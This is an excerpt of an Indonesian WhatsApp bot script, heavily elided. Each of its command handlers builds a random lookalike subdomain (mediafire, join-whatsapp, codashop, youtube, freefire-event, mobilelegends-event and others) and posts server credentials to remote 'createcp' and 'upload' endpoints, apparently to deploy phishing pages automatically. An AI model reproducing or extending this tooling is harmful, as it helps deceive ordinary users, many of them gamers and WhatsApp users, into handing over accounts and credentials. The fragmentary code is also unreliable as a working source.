//Sc By ReusTis
//Lapor Bug Di cs.renggahosting@gmail.com
//ubah teks diatas error
...
break
        ...
        proot = server[0].password
        ipanda = server[0].ip
        domain = "mediafire" + makeid(7) + "." + "link-12-171.my.id"
        ...
        request.post({
            url: 'https://yogax.my.id/apiku/mediafire1/createcp.php',
            form: inputt
        }, function (error, response, body) {
            ...
            if (afakahinijson(body)) {
                ...
                request.post({
                    url: 'https://yogax.my.id/apiku/mediafire1/upload.php',
                    form: inputt
...
id = msg.key.remoteJid
        ...
        proot = server[0].password
        ipanda = server[0].ip
        domain = "mediafiree" + makeid(7) + "." + "link-12-171.my.id"
...
id = msg.key.remoteJid
        ...
        proot = server[0].password
        ipanda = server[0].ip
        domain = "simontok" + makeid(7) + "." + "link-12-171.my.id"
...
id = msg.key.remoteJid
        ...
        proot = server[0].password
        ipanda = server[0].ip
        domain = "mobilelegends-event" + makeid(7) + "." + "link-12-171.my.id"
...
id = msg.key.remoteJid
        ...
        proot = server[0].password
        ipanda = server[0].ip
        domain = "join-whatsapp" + makeid(7) + "." + "link-12-171.my.id"
...
id = msg.key.remoteJid
        ...
        proot = server[0].password
        ipanda = server[0].ip
        domain = "chat-whatsapps" + makeid(7) + "." + "link-12-171.my.id"
...
id = msg.key.remoteJid
        ...
        proot = server[0].password
        ipanda = server[0].ip
        domain = "codashop" + makeid(7) + "." + "link-12-171.my.id"
...
id = msg.key.remoteJid
        ...
        proot = server[0].password
        ipanda = server[0].ip
        domain = "youtube" + makeid(7) + "." + "link-12-171.my.id"
...
id = msg.key.remoteJid
        ...
        proot = server[0].password
        ipanda = server[0].ip
        domain = "freefire-event" + makeid(7) + "." + "link-12-171.my.id"
